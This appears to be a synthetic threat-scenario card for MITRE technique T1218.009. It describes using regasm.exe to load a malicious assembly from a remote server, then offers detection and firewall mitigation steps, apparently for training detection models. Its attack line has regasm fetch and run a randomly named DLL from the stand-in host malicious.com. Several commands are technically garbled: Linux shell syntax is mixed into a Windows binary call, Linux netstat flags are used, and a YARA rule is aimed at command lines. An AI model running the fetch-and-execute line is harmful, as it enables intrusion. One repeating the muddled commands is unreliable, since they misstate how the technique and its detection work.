---
type: campaign
scenario_id: 98
tactic: Defense Evasion
technique: "T1218.009: Regasm"
technique_id: T1218.009
tags: [campaign, lotl, defense_evasion]
---

# Using regasm.exe to execute malicious assembly from remote server.

## Threat Description
Using regasm.exe to execute malicious assembly from remote server.

## Attack Command
```
regasm /codebase http://malicious.com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)
```

## Detection Logic
Monitor regasm network activity: `netstat -anp | grep regasm`; YARA rule: `rule RegasmRemote { strings: $a = /regasm.*http/ nocase; condition: $a }`

## Mitigation
Block regasm network access: `netsh advfirewall firewall add rule name='Block regasm' dir=out program='%windir%\Microsoft.NET\Framework\v4.0.30319\regasm.exe' action=block`; Use AppLocker for assemblies.

## AI Training Prompt
Train AI to detect regasm remote execution and suggest firewall rules.

## References
- MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
